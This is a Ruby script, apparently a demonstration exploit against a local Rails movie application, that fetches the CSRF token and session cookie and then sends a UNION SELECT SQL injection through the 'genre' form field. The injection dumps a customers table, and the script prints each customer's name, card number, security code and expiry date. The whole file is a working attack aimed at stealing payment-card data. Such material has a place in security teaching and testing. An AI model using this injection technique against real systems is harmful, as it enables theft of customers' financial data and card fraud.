require 'socket'
require 'cgi'

httpGet = Array.new
httpGet << "GET /movies/selectGenre HTTP/1.1"
httpGet << "Host: localhost:3000"
httpGet << "Connection: close"

# Create HTTP request string
request = httpGet.join("\r\n") + "\r\n\r\n"

# Open socket
socket = TCPSocket.open("localhost", 3000)

# Send request
socket.puts(request)

# Read response
response = socket.read

# Get authenticity token
response =~ /name=\"authenticity_token\" type=\"hidden\" value=\"(.*)\"/
auth_token = $1
escaped_auth_token = CGI::escape(auth_token)

# Get session id
response =~ /Set-Cookie: (.*); path=/
session_id = $1

# Close socket
socket.close

injection = "Action' AND 0=1 UNION 
			SELECT id, name as title, card_number as director, security_code as star,
			exp_month as release_year, exp_year as genre, billing_zip as rating
			FROM customers;"

post_data = "genre=";
post_data += CGI::escape(injection)
post_data += "&authenticity_token=#{escaped_auth_token}"

httpPost = Array.new
httpPost << "POST /movies/showGenre HTTP/1.1"
httpPost << "Host: localhost:3000"
httpPost << "Connection: close"
httpPost << "Content-Type: application/x-www-form-urlencoded"
httpPost << "Content-Length: #{post_data.length}"
httpPost << "Cookie: #{session_id}"

# Create HTTP request string
request = httpPost.join("\r\n") + "\r\n\r\n" + post_data

# Open socket
socket = TCPSocket.open("localhost", 3000)

# Send request
socket.puts(request)

# Read response
response = socket.read

# Close socket
socket.close

table = response.split("table")
user_data = table[1].split(/<a href=\".*\">/)
user_data.shift

user_data.each do |user|
	user =~ /(.*)<\/a><\/td>/
	customer_name = $1
	result = []
	arrInner = user.split(/<td>/)
	arrInner.shift
	arrInner.each_with_index do |attribute, i|
		attribute =~ /(.*)<\/td>/
		result[i] = $1
	end
	puts "Name: " + customer_name
	puts "Card Number: " + result[0]
	puts "Security Code: " + result[1]
	puts "Expiration Date: " + result[2]+"\/"+result[3]
	puts "-----------------------------"
end
